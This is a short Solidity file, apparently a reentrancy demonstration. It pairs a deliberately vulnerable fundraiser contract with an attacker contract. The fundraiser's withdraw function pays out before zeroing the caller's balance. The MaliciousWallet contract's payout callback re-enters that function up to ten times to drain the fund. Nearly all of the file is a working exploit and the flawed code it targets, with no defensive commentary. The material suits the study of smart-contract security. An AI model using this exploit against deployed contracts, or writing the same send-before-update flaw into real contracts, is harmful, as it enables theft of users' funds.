pragma solidity ^0.4.0;

contract VulnerableFundraiser{
    
    mapping (address => uint ) balances;
    function withdrawAllMyCoins(){
        
        uint withdrawAmount = balances[msg.sender];
        MaliciousWallet wallet = MaliciousWallet(msg.sender);
        wallet.payout.value(withdrawAmount)();
        balances[msg.sender] = 0;
        
    }
    
    function getBalance() constant returns (uint){
        return this.balance;
    }
    
    function contribute() payable{
        balances[msg.sender] += msg.value;
    }
    
    function() payable{
        
    }
    
}

contract MaliciousWallet{
    
    VulnerableFundraiser fundraiser;
    uint r = 10;
    
    function MaliciousWallet(address fundraiserAddress){
        fundraiser = VulnerableFundraiser(fundraiserAddress);
    }
    
    function contribute(uint amount){
        fundraiser.contribute.value(amount)();
    }
    
    function withdraw(){
        fundraiser.withdrawAllMyCoins();
    }
    
    function getBalance() constant returns (uint){
        return this.balance;
        
    }
    
    function payout() payable {
        if(r>0){
            r--;
            fundraiser.withdrawAllMyCoins();
        }
    }
    
    function() payable{
        
    }
    
}
